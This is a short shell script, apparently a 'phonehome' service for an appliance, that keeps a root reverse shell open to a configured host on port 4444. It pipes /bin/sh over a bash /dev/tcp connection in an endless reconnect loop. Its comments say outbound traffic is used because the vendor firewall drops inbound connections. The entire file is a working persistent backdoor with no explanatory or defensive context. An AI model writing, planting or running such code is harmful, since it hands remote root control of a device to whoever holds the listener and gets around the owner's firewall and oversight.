#!/bin/sh
# Optional outbound root shell to the LAN host on :4444.
# Inbound 4444 is DROPped by the vendor chain, but outbound is fine, and
# /bin/bash supports /dev/tcp on this build. Single instance.
# The host is set at deploy time (edit PH below); empty disables the lane.
PH="${ALVIDAA_PHONEHOME_HOST:-}"
RPORT=4444
[ -n "$PH" ] || exit 0
. /var/local/alvidaa/alive.sh
L=/var/local/alvidaa/phonehome.lock
if mkdir "$L" 2>/dev/null; then
    echo $$ > "$L/pid"
else
    alive "$(cat "$L/pid" 2>/dev/null)" phonehome.sh && exit 0
    rm -rf "$L"; mkdir "$L" 2>/dev/null || exit 1; echo $$ > "$L/pid"
fi
trap 'rm -rf "$L"' EXIT INT TERM
while true; do
    /bin/bash -c "exec 3<>/dev/tcp/$PH/$RPORT && exec /bin/sh <&3 >&3 2>&3" 2>/dev/null
    sleep 5
done
